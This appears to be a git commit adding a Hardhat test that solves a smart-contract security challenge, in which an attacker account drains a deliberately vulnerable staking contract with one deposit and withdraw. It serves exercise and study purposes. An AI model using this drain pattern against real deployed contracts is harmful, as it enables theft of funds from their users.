f8067d9b91da238f024e37c3168ddbc4f22b67c4
0xToshii <94262432+0xToshii@users.noreply.github.com>
2022-08-23 15:13:48 -0700

    may the force

---
+++ test/1-may-the-force.ts
@@ -0,0 +1,39 @@
+import { expect } from "chai";
+import { Contract, Signer, BigNumber } from "ethers";
+import { ethers } from "hardhat";
+const BN = BigNumber;
+let precision = BN.from(10).pow(18);
+
+let accounts: Signer[];
+let attacker: Signer;
+let other1: Signer;
+let other2: Signer;
+let miniMeToken: Contract;
+let mayTheForce: Contract;
+
+before(async () => {
+  accounts = await ethers.getSigners();
+  [attacker, other1, other2] = accounts;
+
+  const miniMeTokenFactory = await ethers.getContractFactory('MiniMeToken')
+  miniMeToken = await miniMeTokenFactory.connect(other2).deploy('Yoda token', 18, 'YODA')
+
+  const mayTheForceFactory = await ethers.getContractFactory('MayTheForceBeWithYou')
+  mayTheForce = await mayTheForceFactory.connect(other2).deploy(miniMeToken.address)
+
+  // although in this case there are no other stakers, this does not change the exploit
+  await miniMeToken.connect(other2).mint(mayTheForce.address,precision.mul(1))
+});
+
+it("solves the challenge", async function () {
+
+  // the first call to deposit will mint an arbitrary number of tokens to the caller
+  await mayTheForce.connect(attacker).deposit(precision.mul(1))
+  await mayTheForce.connect(attacker).withdraw(precision.mul(1))
+
+});
+
+after(async () => {
+  expect(await miniMeToken.balanceOf(mayTheForce.address)).to.be.equal(0)
+  expect(await miniMeToken.balanceOf(await attacker.getAddress())).to.be.equal(precision.mul(1))
+});
